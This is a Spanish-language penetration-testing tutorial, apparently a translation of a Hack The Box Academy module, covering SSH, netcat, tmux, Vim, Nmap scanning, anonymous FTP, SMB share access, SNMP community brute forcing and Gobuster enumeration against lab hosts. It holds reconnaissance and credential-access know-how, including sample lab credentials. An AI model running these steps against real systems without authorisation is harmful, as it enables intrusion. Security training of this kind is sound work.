Secure Shell (SSH) es un protocolo de red que se ejecuta en el puerto 22 de forma predeterminada y brinda a los usuarios, como administradores de sistemas, una forma segura de acceder a una computadora de forma remota. SSH se puede configurar con autenticación de contraseña o sin contraseña usando autenticación de clave pública mediante un par de claves pública/privada de SSH. SSH se puede utilizar para acceder de forma remota a sistemas en la misma red, a través de Internet, facilitar las conexiones a recursos en otras redes mediante el reenvío de puertos/proxy, y cargar/descargar archivos hacia y desde sistemas remotos. 

SSH utiliza un modelo cliente-servidor, conectando un usuario que ejecuta una aplicación de cliente SSH como OpenSSH a un servidor SSH. Mientras atacamos una box o durante una evaluación del mundo real, a menudo obtenemos credenciales de texto claro o una clave privada SSH que se puede aprovechar para conectarnos directamente a un sistema a través de SSH. Una conexión SSH suele ser mucho más estable que una conexión shell inversa y, a menudo, se puede usar como un "jump host" para enumerar y atacar otros hosts en la red, transferir herramientas, configurar la persistencia, etc. Si obtenemos un conjunto de credenciales , podemos usar SSH para iniciar sesión de forma remota en el servidor usando el nombre de usuario en la IP del servidor remoto, de la siguiente manera: 

~~~
$ ssh Bob@10.10.10.10

Bob@remotehost's password: *********

Bob@remotehost#
~~~

También es posible leer claves privadas locales en un sistema comprometido o agregar nuestra clave pública para obtener acceso SSH a un usuario específico, como veremos en una sección posterior. Como podemos ver, SSH es una excelente herramienta para conectarse de forma segura a una máquina remota. También proporciona una forma de asignar puertos locales en la máquina remota a nuestro host local, lo que puede resultar útil en ocasiones. 
___

### USANDO NETCAT

Netcat, ncat o nc es una excelente utilidad de red para interactuar con los puertos TCP/UDP. Se puede utilizar para muchas cosas durante un pentest. Su uso principal es para conectarse a shells, de lo que hablaremos más adelante en este módulo. Además de eso, netcat se puede usar para conectarse a cualquier puerto de escucha e interactuar con el servicio que se ejecuta en ese puerto. Por ejemplo, SSH está programado para manejar conexiones a través del puerto 22 para enviar todos los datos y claves. Podemos conectarnos al puerto TCP 22 con netcat: 

~~~
$ netcat 10.10.10.10 22

SSH-2.0-OpenSSH_8.4p1 Debian-3
~~~

Como podemos ver, el puerto 22 nos envió su banner, indicando que SSH se está ejecutando en él. Esta técnica se llama Banner Grabbing y puede ayudar a identificar qué servicio se está ejecutando en un puerto en particular. Netcat viene preinstalado en la mayoría de las distribuciones de Linux. También podemos descargar una copia para máquinas Windows. Hay otra alternativa de Windows a netcat codificada en PowerShell llamada PowerCat. Netcat también se puede usar para transferir archivos entre máquinas, como veremos más adelante. 

Otra utilidad de red similar es socat, que tiene algunas funciones que netcat no admite, como el reenvío de puertos y la conexión a dispositivos serie. Socat también se puede usar para actualizar un shell a un TTY completamente interactivo. Veremos algunos ejemplos de esto en una sección posterior. Socat es una utilidad muy útil que debería ser parte del conjunto de herramientas de cada probador de penetración. Un binario independiente de Socat se puede transferir a un sistema después de obtener la ejecución remota del código para obtener una conexión de shell inversa más estable. 

socat es como netcat con esteroides y es una navaja suiza muy potente para redes. Socat se puede usar para pasar TTY completo a través de conexiones TCP. 

Si socat está instalado en el servidor de la víctima, puede iniciar una reverse shell con él. También debe captar la conexión con socat para obtener todas las funciones. 
___
### USANDO TMUX

Los multiplexores de terminales, como tmux o Screen, son excelentes utilidades para expandir las funciones de un terminal Linux estándar, como tener múltiples ventanas dentro de un terminal y saltar entre ellas. Veamos algunos ejemplos del uso de tmux, que es el más común de los dos. Si tmux no está presente en nuestro sistema Linux, podemos instalarlo con el siguiente comando: 

~~~
$ sudo apt install tmux -y
~~~

Una vez que tenemos tmux, podemos iniciarlo ingresando el comando tmux: 
![tmux](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_1.jpg)

La tecla predeterminada para ingresar el prefijo de comandos tmux es [CTRL + B]. Para abrir una nueva ventana en tmux, podemos presionar el prefijo 'i.e. [CTRL + B]' y luego presiona C: 

![CTRL+B](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_2.jpg)

Vemos las ventanas numeradas en la parte inferior. Podemos cambiar a cada ventana presionando el prefijo y luego ingresando el número de la ventana, como 0 o 1. También podemos dividir una ventana verticalmente en paneles presionando el prefijo y luego [MAYÚS + %]: 

![MAYUS+%](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_3.jpg)

También podemos dividirnos en paneles horizontales presionando el prefijo y luego [MAYÚS + "]: 

![MAYUS+"](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_4.jpg)

Podemos cambiar entre paneles presionando el prefijo y luego las flechas izquierda o derecha para el cambio horizontal o las flechas hacia arriba o hacia abajo para el cambio vertical. Los comandos anteriores cubren algunos usos básicos de tmux. Es una herramienta poderosa y se puede usar para muchas cosas, incluido el registro, que es muy importante durante cualquier compromiso técnico. [Esta hoja de trucos](https://tmuxcheatsheet.com/) es una referencia muy útil. Además, este video [Introducción a tmux](https://www.youtube.com/watch?v=Lqehvpe_djs) de ipsec vale la pena.
___

### USANDO VIM

Vim es un excelente editor de texto que se puede usar para escribir código o editar archivos de texto en sistemas Linux. Uno de los grandes beneficios de usar Vim es que se basa completamente en el teclado, por lo que no tiene que usar el mouse, lo que (una vez que lo tengamos) aumentará significativamente su productividad y eficiencia al escribir/editar código. Por lo general, encontramos Vim o Vi instalado en sistemas Linux, por lo que aprender a usarlo nos permite editar archivos incluso en sistemas remotos. Vim también tiene muchas otras características, como extensiones y complementos, que pueden extender significativamente su uso y convertirse en un excelente editor de código. Veamos algunos de los conceptos básicos de Vim. Para abrir un archivo con Vim, podemos agregar el nombre del archivo después: 

~~~
$vim /etc/hosts
~~~

![vim](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_1.jpg)

Si queremos crear un archivo nuevo, ingrese el nombre del archivo nuevo y Vim abrirá una ventana nueva con ese archivo. Una vez que abrimos un archivo, estamos en modo normal de solo lectura, lo que nos permite navegar y leer el archivo. Para editar el archivo, presionamos i para ingresar al modo de inserción, que se muestra con "-- INSERT --" en la parte inferior de Vim. Posteriormente, podemos mover el cursor de texto y editar el archivo: 

![INSERT](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_2.jpg)

Una vez que hayamos terminado de editar un archivo, podemos presionar la tecla de escape esc para salir del modo de inserción y volver al modo normal. Cuando estamos en modo normal, podemos usar las siguientes teclas para realizar algunos atajos útiles: 

| Command |	Description |
|--|--|
| x | Cut character |
| dw | Cut word |
| dd | Cut full line |
| yw | Copy word |
| yy | Copy full line |
| p | Paste |

~~~
Tips: podemos multiplicar cualquier comando para que se ejecute varias veces agregando un número antes. Por ejemplo, '4yw' copiaría 4 palabras en lugar de una, y así sucesivamente.
~~~
Si queremos guardar un archivo o salir de Vim, tenemos que pulsar : para entrar en modo comando. Una vez que lo hagamos, veremos cualquier comando que escribamos en la parte inferior de la ventana de vim:

![:](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_3.jpg)

Hay muchos comandos disponibles para nosotros. Los siguientes son algunos de ellos: 

| Command | Description |
|--|--|
| :1 |	Go to line number 1. |
| :w |	Write the file, save |
| :q |	Quit |
| :q! |	Quit without saving |
| :wq |	Write and quit |

Vim es una herramienta muy poderosa y tiene muchos otros comandos y funciones. Esta [hoja de trucos](https://vimsheet.com/) es un excelente recurso para desbloquear aún más el poder de Vim. 

___
## SERVICIOS DE ESCANEO

¡Estamos listos para dar un paso más y comenzar a explorar una máquina! Lo primero que debemos hacer es identificar el sistema operativo y los servicios disponibles que podrían estar ejecutándose. Un servicio es una aplicación que se ejecuta en una computadora y que realiza alguna función útil para otros usuarios o computadoras. Llamamos a estas máquinas especializadas que albergan estos servicios útiles "server" en lugar de estaciones de trabajo, lo que permite a los usuarios interactuar y consumir estos diversos servicios. Lo que nos interesa son los servicios que han sido mal configurados o tienen una vulnerabilidad. En lugar de realizar las acciones esperadas como parte del servicio, estamos interesados en ver si podemos obligar al servicio a realizar alguna acción no deseada que respalde nuestros objetivos, como ejecutar un comando de nuestra elección.

A las computadoras se les asigna una dirección IP, lo que les permite ser identificados de manera única y accesibles en una red. A los servicios que se ejecutan en estas computadoras se les puede asignar un número de puerto para que el servicio sea accesible. Como se mencionó anteriormente, los números de puerto van del 1 al 65 535, y el rango de puertos conocidos del 1 al 1 023 se reserva para servicios privilegiados. El puerto 0 es un puerto reservado en redes TCP/IP y no se usa en mensajes TCP o UDP. Si algo intenta vincularse al puerto 0 (como un servicio), se vinculará al siguiente puerto disponible por encima del puerto 1024 porque el puerto 0 se trata como un puerto "comodín". 

Para acceder a un servicio de forma remota, debemos conectarnos utilizando la dirección IP y el número de puerto correctos y utilizar un idioma que comprenda el servicio. Examinar manualmente todos los 65 535 puertos en busca de cualquier servicio disponible sería laborioso, por lo que se han creado herramientas para automatizar este proceso y escanear el rango de puertos por nosotros. Una de las herramientas de escaneo más utilizadas es Nmap (Network Mapper). 
___

### NMAP

Comencemos con el escaneo más básico. Supongamos que queremos realizar un escaneo básico contra un objetivo que reside en 10.129.42.253. Para hacer esto debemos escribir `nmap 10.129.42.253` y presionar enter. Vemos que el escaneo de Nmap se completó muy rápido. Esto se debe a que, si no especificamos ninguna opción adicional, Nmap solo escaneará los 1000 puertos más comunes de forma predeterminada. El resultado del escaneo revela que los puertos 21, 22, 80, 139 y 445 están disponibles. 

~~~
$ nmap 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
~~~

Debajo del encabezado `PORT`, también nos dice que estos son puertos TCP. De forma predeterminada, Nmap realizará un escaneo TCP a menos que se le solicite específicamente que realice un escaneo UDP. 

El encabezado `STATE` confirma que estos puertos están abiertos. A veces veremos listados otros puertos que tienen un estado diferente, como `filtered`. Esto puede suceder si un firewall solo permite el acceso a los puertos desde direcciones específicas.
El encabezado `SERVICE` nos dice que el nombre del servicio generalmente se asigna al número de puerto específico. Sin embargo, el escaneo predeterminado no nos dirá qué está escuchando en ese puerto. Hasta que le indiquemos a Nmap que interactúe con el servicio e intente obtener información de identificación, podría ser otro servicio por completo. 

A medida que nos familiaricemos, notaremos que varios puertos se asocian comúnmente con Windows o Linux. Por ejemplo, el puerto 3389 es el puerto predeterminado para Servicios de escritorio remoto y es una excelente indicación de que el objetivo es una máquina con Windows. En nuestro escenario actual, la disponibilidad del puerto 22 (SSH) indica que el objetivo ejecuta Linux/Unix, pero este servicio también se puede configurar en Windows. Ejecutemos un escaneo Nmap más avanzado y recopilemos más información sobre el dispositivo de destino. 

Podemos usar el parámetro `-sC` para especificar que se deben usar scripts de Nmap para tratar de obtener información más detallada. El parámetro `-sV` le indica a Nmap que realice un escaneo de versión. En este escaneo, Nmap tomará huellas digitales de los servicios en el sistema de destino e identificará el protocolo del servicio, el nombre de la aplicación y la versión. El escaneo de versiones está respaldado por una base de datos completa de más de 1000 firmas de servicio. Finalmente, `-p-` le dice a Nmap que queremos escanear todos los 65,535 puertos TCP. 

~~~
nmap -sV -sC -p- 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:18 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: PHP 7.4.3 - phpinfo()
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-25T21:21:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 233.68 seconds
~~~

Esto devuelve mucha más información. Vemos que tomó mucho más tiempo escanear 65,535 puertos que 1,000 puertos. Las opciones `-sC` y `-sV` también aumentan la duración de un escaneo, ya que en lugar de realizar un simple protocolo de enlace TCP, realizan muchas más comprobaciones. Notamos que esta vez hay un encabezado `VERSION`, que informa la versión del servicio y el sistema operativo si es posible identificarlo. 

Hasta el momento sabemos que el sistema operativo es Ubuntu Linux. Las versiones de la aplicación también pueden ayudar a revelar la versión del sistema operativo de destino. Tome OpenSSH, por ejemplo. Vemos que la versión informada es `OpenSSH 8.2p1 Ubuntu 4ubuntu0.1.` A partir de la inspección de los [changelog](https://launchpad.net/ubuntu/yakkety/+source/openssh/+changelog) del paquete SSH de Ubuntu, vemos que la versión de lanzamiento toma el formato `1:7.3p1-1ubuntu0.1.` Al actualizar nuestra versión para que se ajuste a este formato, obtenemos `1:8.2p1-4ubuntu0.1.` Una búsqueda rápida de esta versión en línea revela que está incluida en Ubuntu Linux Focal Fossa 20.04. 

![1:8.2p1-4ubuntu0.1 release](https://academy.hackthebox.com/storage/modules/77/google1.png)

Otra búsqueda rápida revela que la fecha de lanzamiento de este sistema operativo es el 23 de abril de 2020. 

![ubuntu focal 20.04 release date](https://academy.hackthebox.com/storage/modules/77/google2.png)

Sin embargo, vale la pena señalar que esta técnica de referencias cruzadas no es del todo confiable, ya que es posible instalar paquetes de aplicaciones más recientes en una versión anterior del sistema operativo. la flag de escaneo del script `-sC` hace que Nmap informe los encabezados del servidor de la pagina `http-server-header` y el título de la página `http-title` para cualquier página web alojada en el servidor web. El título de la página web `PHP 7.4.3 - phpinfo()` indica que se trata de un archivo PHPInfo, que a menudo se crea manualmente para confirmar que PHP se ha instalado correctamente. El título (y la página PHPInfo) también revela la versión de PHP, que no vale nada si es vulnerable. 

![PHPInfo](https://academy.hackthebox.com/storage/modules/77/phpinfo.png)

___
### NMAP SCRIPT

Especificar `-sC` ejecutará muchas secuencias de comandos predeterminadas útiles en un objetivo, pero hay casos en los que se requiere ejecutar una secuencia de comandos específica. Por ejemplo, en el ámbito de una evaluación, se nos puede pedir que auditemos una gran instalación de Citrix. Podríamos usar [este](https://raw.githubusercontent.com/cyberstruggle/DeltaGroup/master/CVE-2019-19781/CVE-2019-19781.nse) script de Nmap para auditar la vulnerabilidad grave de Citrix NetScaler ([CVE-2019–19781](https://blog.rapid7.com/2020/01/17/active-exploitation-of-citrix-netscaler-cve-2019-19781-what-you-need-to-know/)), mientras que Nmap también tiene otros scripts para auditar una instalación de Citrix. 

Scripts de NMAP
~~~
$ locate scripts/citrix

/usr/share/nmap/scripts/citrix-brute-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps.nse
/usr/share/nmap/scripts/citrix-enum-servers-xml.nse
/usr/share/nmap/scripts/citrix-enum-servers.nse
~~~

La sintaxis para ejecutar un script Nmap es `nmap --script <nombre del script> -p<puerto> <host>`. Los scripts de Nmap son una excelente manera de mejorar la funcionalidad de nuestros escaneos, y la inspección de las opciones disponibles dará sus frutos. Consulte el módulo [Enumeración de red con Nmap](https://academy.hackthebox.com/module/details/19) para obtener un estudio más detallado de la herramienta Nmap. 
___

### ATACANDO SERVICIOS DE RED

#### Banner Grabbing

Como se mencionó anteriormente, banner grabbing es una técnica útil para identificar rápidamente un servicio. A menudo, un servicio buscará identificarse mostrando un banner una vez que se inicie una conexión. Nmap intentará captar los banners si se especifica la sintaxis `nmap -sV --script=banner <objetivo>`. También podemos intentar esto manualmente usando Netcat. Tomemos otro ejemplo, usando la versión nc de Netcat: 

~~~
$ nc -nv 10.129.42.253 21

(UNKNOWN) [10.129.42.253] 21 (ftp) open
220 (vsFTPd 3.0.3)
~~~
Esto revela que la versión de `vsFTPd` en el servidor es `3.0.3.` También podemos automatizar este proceso utilizando el potente motor de secuencias de comandos de Nmap: `nmap -sV --script=banner -p21 10.10.10.0/24.` 
___

### FTP

Vale la pena familiarizarse con FTP, ya que es un protocolo estándar y este servicio a menudo puede contener datos interesantes. Un escaneo de Nmap del puerto predeterminado para FTP (21) revela la instalación de vsftpd 3.0.3 que identificamos anteriormente. Además, también informa que la autenticación anónima está habilitada y que hay un directorio pub disponible. 

~~~
nmap -sC -sV -p21 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 00:54 GMT
Nmap scan report for 10.129.42.253
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 19 23:50 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
~~~

Conectémonos al servicio usando la línea de comandos ftp. 

~~~
ftp -p 10.129.42.253

Connected to 10.129.42.253.
220 (vsFTPd 3.0.3)
Name (10.129.42.253:user): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
227 Entering Passive Mode (10,129,42,253,158,60).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
226 Directory send OK.

ftp> cd pub
250 Directory successfully changed.

ftp> ls
227 Entering Passive Mode (10,129,42,253,182,129).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            18 Feb 25 19:25 login.txt
226 Directory send OK.

ftp> get login.txt
local: login.txt remote: login.txt
227 Entering Passive Mode (10,129,42,253,181,53).
150 Opening BINARY mode data connection for login.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (165.8314 kB/s)

ftp> exit
221 Goodbye.
~~~

En el shell anterior, vemos que FTP admite comandos comunes como `cd` y `ls` y nos permite descargar archivos usando el comando `get`. La inspección del login.txt descargado revela credenciales que podríamos usar para mejorar nuestro acceso al sistema. 

~~~
$ cat login.txt 
admin:ftp@dmin123
~~~
___

### SMB

SMB (Server Message Block) es un protocolo predominante en las máquinas Windows que proporciona muchos vectores para el movimiento vertical y lateral. Los datos confidenciales, incluidas las credenciales, pueden estar en recursos compartidos de archivos de red, y algunas versiones SMB pueden ser vulnerables a exploits de RCE como [EternalBlue](https://www.avast.com/c-eternalblue). Es crucial enumerar cuidadosamente esta importante superficie de ataque potencial. Nmap tiene muchas secuencias de comandos para enumerar SMB, como [smb-os-discovery.nse](https://nmap.org/nsedoc/scripts/smb-os-discovery.html), que interactuará con el servicio SMB para extraer la versión del sistema operativo informada. 

~~~
$ nmap --script smb-os-discovery.nse -p445 10.10.10.40

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
Nmap scan report for doctors.htb (10.10.10.40)
Host is up (0.022s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: CEO-PC
|   NetBIOS computer name: CEO-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-27T00:59:46+00:00

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
~~~

En este caso, el host ejecuta un sistema operativo Windows 7 heredado y podríamos realizar una enumeración adicional para confirmar si es vulnerable a EternalBlue. Metasploit Framework tiene varios [módulos](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) para EternalBlue que se pueden usar para validar la vulnerabilidad y explotarla, como veremos en una próxima sección. Podemos ejecutar un escaneo contra nuestro objetivo para esta sección del módulo para recopilar información del servicio SMB. Podemos determinar que el host ejecuta un kernel de Linux, Samba versión 4.6.2, y el nombre de host es GS-SVCSCAN. 

~~~
$ nmap -A -p445 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-25T21:30:06
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   111.62 ms 10.10.14.1
2   111.89 ms 10.129.42.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
~~~

___

### SHARES

SMB permite a los usuarios y administradores compartir carpetas y hacer que otros usuarios puedan acceder a ellas de forma remota. A menudo, estos recursos compartidos contienen archivos que contienen información confidencial, como contraseñas. Una herramienta que puede enumerar e interactuar con recursos compartidos SMB es [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). El indicador `-L` especifica que queremos recuperar una lista de recursos compartidos disponibles en el host remoto, mientras que `-N` suprime la solicitud de contraseña. 

~~~
$ smbclient -N -L \\\\10.129.42.253

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	users           Disk      
	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

~~~

Esto revela los usuarios compartidos no predeterminados. Intentemos conectarnos como usuario invitado. 

~~~

$ smbclient \\\\10.129.42.253\\users

Enter WORKGROUP\users's password: 
Try "help" to get a list of possible commands.

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

smb: \> exit

~~~

El comando `ls` generó un mensaje de acceso denegado, lo que indica que no se permite el acceso de invitados. Intentemos nuevamente usando las credenciales del usuario bob (`bob:Welcome1`). 

~~~

$ smbclient -U bob \\\\10.129.42.253\\users

Enter WORKGROUP\bob's password: 
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 15:05:31 2021
  bob                                 D        0  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available
		
smb: \> cd bob

smb: \bob\> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 16:42:23 2021
  passwords.txt                       N      156  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available
		
smb: \bob\> get passwords.txt 
getting file \bob\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

~~~

Obtuvimos acceso con éxito al recurso compartido de los usuarios usando credenciales y obtuvimos acceso al interesante archivo passwords.txt, que se puede descargar con el comando get. 

___

### SNMP

Las Community strings SNMP brindan información y estadísticas sobre un enrutador o dispositivo, lo que nos ayuda a obtener acceso a él. Las community strings predeterminadas del fabricante de `public` y `private`  a menudo no cambian. En las versiones 1 y 2c de SNMP, el acceso se controla mediante una community string de texto sin formato y, si conocemos el nombre, podemos acceder a él. El cifrado y la autenticación solo se agregaron en la versión 3 de SNMP. Se puede obtener mucha información de SNMP. La examinacion de los parámetros de procesos puede revelar credenciales pasadas en la línea de comando, que podrían reutilizarse para otros servicios accesibles externamente dada la prevalencia de la reutilización de contraseñas en entornos empresariales. También se puede revelar información de enrutamiento, servicios vinculados a interfaces adicionales y la versión del software instalado. 

~~~
$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
~~~

~~~
$ snmpwalk -v 2c -c private  10.129.42.253 

Timeout: No Response from 10.129.42.253
~~~

Se puede usar una herramienta como [onesixtyone](https://github.com/trailofbits/onesixtyone) para aplicar fuerza bruta a los nombres de las cadenas comunitarias mediante un archivo de diccionario de cadenas comunitarias comunes, como el archivo `dict.txt` incluido en el repositorio de GitHub para la herramienta. 

~~~
$ onesixtyone -c dict.txt 10.129.42.254

Scanning 1 hosts, 51 communities
10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
~~~

___

### CONCLUSION

El escaneo y la enumeración de servicios es un tema amplio sobre el que aprenderemos más a medida que avancemos. Los aspectos que hemos cubierto aquí se aplican a muchas redes, incluidas las máquinas HTB. 
___

## ENUMERACION WEB

Al realizar un análisis de servicios, a menudo nos encontramos con servidores web que se ejecutan en los puertos 80 y 443. Los servidores web alojan aplicaciones web (a veces más de 1) que a menudo proporcionan una superficie de ataque considerable y un objetivo de gran valor durante una prueba de penetración. La enumeración web adecuada es crítica, especialmente cuando una organización no está exponiendo muchos servicios o esos servicios están debidamente parcheados. 

___

### GOBUSTER

Después de descubrir una aplicación web, siempre vale la pena comprobar si podemos descubrir archivos o directorios ocultos en el servidor web que no estén destinados al acceso público. Podemos usar una herramienta como ffuf o GoBuster para realizar esta enumeración de directorios. A veces encontraremos funciones ocultas o páginas/directorios que exponen datos confidenciales que se pueden aprovechar para acceder a la aplicación web o incluso a la ejecución remota de código en el propio servidor web. 

___

### ENUMERACION DE DIRECTORIOS/ARCHIVOS

GoBuster es una herramienta versátil que permite realizar fuerza bruta de DNS, vhost y directorios. La herramienta tiene una funcionalidad adicional, como la enumeración de depósitos públicos de AWS S3. Para los propósitos de este módulo, estamos interesados en los modos de fuerza bruta del directorio (y archivo) especificados con el switch `dir`. Ejecutemos un escaneo simple usando la worldlist `dirb common.txt.`

~~~
$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.121/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/11 21:47:25 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.php (Status: 200)
/server-status (Status: 403)
/wordpress (Status: 301)
===============================================================
2020/12/11 21:47:46 Finished
===============================================================
~~~

Un status code HTTP de 200 revela que la solicitud del recurso fue exitosa, mientras que un status code HTTP 403 indica que tenemos prohibido acceder al recurso. Un status code 301 indica que estamos siendo redirigidos, lo cual no es un caso de falla. Vale la pena familiarizarse con los distintos status code HTTP, que se pueden encontrar [aquí](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes). El módulo de la Academia de solicitudes web también cubre los status code HTTP con mayor profundidad. 

El escaneo se completó con éxito e identifica una instalación de WordPress en `/wordpress`. WordPress es el CMS (Content Management System) Sistema de gestión de contenido más utilizado y tiene una superficie de ataque potencial enorme. En este caso, visitar `http://10.10.10.121/wordpress` en un navegador revela que WordPress todavía está en modo de configuración, lo que nos permitirá obtener la ejecución remota de código (RCE) en el servidor. 

![wordpress](https://academy.hackthebox.com/storage/modules/77/wordpress.txt)

___

### ENUMERACION DE SUBDOMINIO DNS

También puede haber recursos esenciales alojados en subdominios, como paneles de administración o aplicaciones con funciones adicionales que podrían explotarse. Podemos usar GoBuster para enumerar los subdominios disponibles de un dominio dado usando el indicador dns para especificar el modo DNS. Primero, clonemos el [repositorio](https://github.com/danielmiessler/SecLists) SecLists GitHub, que contiene muchas listas útiles para fuzzing y explotación: 

~~~
$ git clone https://github.com/danielmiessler/SecLists
~~~

~~~
$ sudo apt install seclists -y
~~~

A continuación, agregue un servidor DNS como 1.1.1.1 al archivo `/etc/resolv.conf`. Nos centraremos en el dominio `inlanefreight.com`, el sitio web de una empresa ficticia de transporte y logística. 

~~~
$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Domain:     inlanefreight.com
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/namelist.txt
===============================================================
2020/12/17 23:08:55 Starting gobuster
===============================================================
Found: blog.inlanefreight.com
Found: customer.inlanefreight.com
Found: my.inlanefreight.com
Found: ns1.inlanefreight.com
Found: ns2.inlanefreight.com
Found: ns3.inlanefreight.com
===============================================================
